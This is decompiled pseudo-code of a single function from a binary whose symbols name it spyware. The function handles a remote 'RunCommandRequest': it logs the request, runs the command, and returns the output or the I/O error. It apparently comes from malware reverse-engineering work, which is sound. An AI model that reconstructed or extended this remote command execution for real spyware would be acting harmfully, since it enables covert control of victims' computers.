
  fn spyware::actions::commands::run_command_message::h528f548903eb1e39(arg1: *mut i128, arg2: *mut i64) -> *mut i128

{
    let mut var_c8: *const i8;
    let mut var_88: *mut *mut [i8; 0x86];
    let mut var_78: *mut *mut i64;
    let mut var_58: *mut i64;
    let mut var_38: *mut i64;
    
    if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4
    {
        var_38 = arg2;
        var_58 = &var_38;
        let var_50_1: fn(arg1: *mut i64, arg2: *mut i64) -> i64 =
            _$LT$$RF$T$u20$as$u20$core..fmt..Display$GT$::fmt::h5f99fd476a35f039;
        var_88 = &data_4ba0b8;
        let var_80_1: i64 = 2;
        let var_68_1: i64 = 0;
        var_78 = &var_58;
        let var_70_1: i64 = 1;
        let rax_1: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4ba0f8);
        var_c8 = "spyware::actions::commands";
        let var_c0_1: i64 = 0x1a;
        let var_b8_1: *const i8 = "spyware::actions::commands";
        let var_b0_1: i64 = 0x1a;
        let var_a8_1: i64 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_88, 4, &var_c8);
    }
    
    arg2[2];
    spyware::actions::commands::run_command::ha7c0eb7cdcbdbc69(&var_38, arg2[1]);
    let mut var_98: *mut *mut i64;
    
    if !(0 + -(var_38))
    {
        var_58 = var_38;
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 4
        {
            var_98 = &var_58;
            let var_90_1: fn(arg1: *mut c_void, arg2: *mut i64) -> i64 = _$LT$alloc..string..String$u20$as$u20$core..fmt..Display$GT$::fmt::h9e2c9c436a613463;
            var_88 = &data_4ba0d8;
            let var_80_3: i64 = 1;
            let var_68_3: i64 = 0;
            let var_78_1: *mut *mut *mut i64 = &var_98;
            let var_70_3: i64 = 1;
            let rax_10: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4ba110);
            var_c8 = "spyware::actions::commands";
            let var_c0_3: i64 = 0x1a;
            let var_b8_4: *const i8 = "spyware::actions::commands";
            let var_b0_3: i64 = 0x1a;
            let var_a8_3: i64 = rax_10;
            log::__private_api::log::h13afddf373bd7d7f(&var_88, 4, &var_c8);
        }
        
        let var_28: i64;
        arg1[1] = var_28;
        *arg1 = var_58;
        *arg1.byte_offset(0x18) = -0x8000000000000000;
    }
    else
    {
        let var_30: *mut *mut i64;
        var_98 = var_30;
        
        if core::sync::atomic::atomic_load::h8c88032dab18ab12() != 0
        {
            var_58 = &var_98;
            let var_50_2: fn(arg1: *mut i64, arg2: *mut i64) -> i64 = _$LT$std..io..error..Error$u20$as$u20$core..fmt..Display$GT$::fmt::hcf0c0103019d8a0a;
            var_88 = &data_4ba0e8;
            let var_80_2: i64 = 1;
            let var_68_2: i64 = 0;
            var_78 = &var_58;
            let var_70_2: i64 = 1;
            let rax_4: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4ba128);
            var_c8 = "spyware::actions::commands";
            let var_c0_2: i64 = 0x1a;
            let var_b8_2: *const i8 = "spyware::actions::commands";
            let var_b0_2: i64 = 0x1a;
            let var_a8_2: i64 = rax_4;
            log::__private_api::log::h13afddf373bd7d7f(&var_88, 1, &var_c8);
        }
        
        let rdx_4: i64 =
            _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4bd00d1297ead281(
            &var_88);
        var_c8 = var_88;
        std::io::error::repr_bitpacked::decode_repr::h049ae64b4e643a43(&var_88, var_98);
        let r15_1: i8 = var_88;
        let rbp_1: i32 = *var_88[4];
        _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h89fbb585ce883e17(
            &var_88, &var_98, rdx_4);
        *arg1.byte_offset(0x28) = var_78;
        *arg1.byte_offset(0x18) = var_88;
        arg1[1] = var_78;
        *arg1 = var_c8;
        arg1[3] = (0 - 0) | rbp_1;
        core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h2ffe2f512d0f1687(var_98);
    }
    core::ptr::drop_in_place$LT$spyware..communication..messages..RunCommandRequest$GT$::he0afe8a5e2188792(arg2);
    arg1
}
